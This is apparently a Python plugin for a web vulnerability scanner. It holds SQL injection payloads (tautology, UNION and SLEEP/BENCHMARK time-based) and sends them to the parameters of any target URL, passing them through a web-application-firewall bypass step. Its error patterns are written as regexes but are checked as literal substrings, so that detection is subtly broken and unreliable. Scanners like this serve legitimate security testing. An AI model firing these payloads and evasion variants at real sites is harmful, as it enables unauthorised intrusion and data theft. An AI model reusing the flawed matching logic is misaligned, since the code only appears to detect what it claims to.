"""
SQL injection vulnerability checker plugin
"""

import time
from typing import Dict, List, Optional

import requests

class SQLInjectionChecker:
    """Checker for SQL injection vulnerabilities"""
    
    def __init__(self):
        """Initialize SQL injection checker"""
        # Error-based payloads
        self.error_payloads = [
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            '" OR 1=1--',
            "' OR 1=1#",
            '" OR 1=1#',
            "' UNION SELECT NULL--",
            '" UNION SELECT NULL--',
            "' UNION SELECT NULL,NULL--",
            '" UNION SELECT NULL,NULL--',
            "') OR ('1'='1",
            '") OR ("1"="1',
            "') OR (1=1--",
            '") OR (1=1--',
        ]
        
        # Time-based payloads
        self.time_payloads = [
            "' AND SLEEP(5)--",
            '" AND SLEEP(5)--',
            "' AND SLEEP(5)#",
            '" AND SLEEP(5)#',
            "' AND BENCHMARK(10000000,SHA1(1))--",
            '" AND BENCHMARK(10000000,SHA1(1))--',
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            '" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--',
        ]
        
        # SQL error patterns
        self.error_patterns = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_.*",
            "valid MySQL result",
            "MySqlClient\\.",
            "ORA-[0-9][0-9][0-9][0-9]",
            "Oracle error",
            "SQLServer JDBC Driver",
            "SQLServerException",
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            "org.hibernate.QueryException",
            "org.hibernate.exception.SQLGrammarException",
            "org.hibernate.exception.JDBCException",
            "PostgreSQL.*ERROR",
            "ERROR.*PostgreSQL",
            "PG::SyntaxError",
            "ERROR.*SQLite",
            "SQLite error",
            "SQLite.*Exception",
        ]
    
    def check(self, session: requests.Session, url: str, waf_bypass) -> Optional[Dict]:
        """
        Check for SQL injection vulnerabilities
        
        Args:
            session: Requests session
            url: Target URL
            waf_bypass: WAF bypass handler
            
        Returns:
            Dictionary with vulnerability details if found, None otherwise
        """
        try:
            # Find input points
            input_points = self._find_input_points(url)
            
            # Test each input point
            for point in input_points:
                # Test error-based SQL injection
                if self._test_error_based(session, point, waf_bypass):
                    return {
                        "type": "SQL Injection",
                        "severity": "critical",
                        "url": url,
                        "evidence": f"Error-based SQL injection found in parameter: {point['param']}",
                        "description": "SQL injection vulnerability allows attackers to manipulate database queries through user input."
                    }
                
                # Test time-based SQL injection
                if self._test_time_based(session, point, waf_bypass):
                    return {
                        "type": "SQL Injection",
                        "severity": "critical",
                        "url": url,
                        "evidence": f"Time-based SQL injection found in parameter: {point['param']}",
                        "description": "Time-based SQL injection vulnerability allows attackers to extract data by manipulating query execution time."
                    }
            
            return None
            
        except Exception as e:
            print(f"Error checking SQL injection: {e}")
            return None
    
    def _find_input_points(self, url: str) -> List[Dict]:
        """Find potential input points for SQL injection testing"""
        input_points = []
        
        # Parse URL parameters
        if "?" in url:
            base_url, params = url.split("?", 1)
            for param in params.split("&"):
                if "=" in param:
                    name, value = param.split("=", 1)
                    input_points.append({
                        "type": "url",
                        "param": name,
                        "value": value,
                        "url": url
                    })
        
        return input_points
    
    def _test_error_based(self, session: requests.Session, point: Dict, waf_bypass) -> bool:
        """Test for error-based SQL injection"""
        try:
            if point['type'] == 'url':
                # Test each payload
                for payload in self.error_payloads:
                    # Generate payload variants
                    payload_variants = waf_bypass.generate_payload_variants(payload)
                    
                    for variant in payload_variants:
                        # Test URL parameter
                        test_url = point['url'].replace(
                            f"{point['param']}={point['value']}", 
                            f"{point['param']}={variant}"
                        )
                        
                        response = session.get(test_url)
                        if response.ok:
                            content = response.text
                            
                            # Check for SQL error messages
                            for pattern in self.error_patterns:
                                if pattern.lower() in content.lower():
                                    return True
            
            return False
            
        except Exception:
            return False
    
    def _test_time_based(self, session: requests.Session, point: Dict, waf_bypass) -> bool:
        """Test for time-based SQL injection"""
        try:
            if point['type'] == 'url':
                # Test each payload
                for payload in self.time_payloads:
                    # Generate payload variants
                    payload_variants = waf_bypass.generate_payload_variants(payload)
                    
                    for variant in payload_variants:
                        # Test URL parameter
                        test_url = point['url'].replace(
                            f"{point['param']}={point['value']}", 
                            f"{point['param']}={variant}"
                        )
                        
                        # Measure response time
                        start_time = time.time()
                        response = session.get(test_url)
                        end_time = time.time()
                        
                        # Check if response time indicates successful injection
                        if response.ok and (end_time - start_time) >= 5:
                            return True
            
            return False
            
        except Exception:
            return False

# Create checker instance
checker = SQLInjectionChecker()

def check(session: requests.Session, url: str, waf_bypass) -> Optional[Dict]:
    """Check for SQL injection vulnerabilities"""
    return checker.check(session, url, waf_bypass) 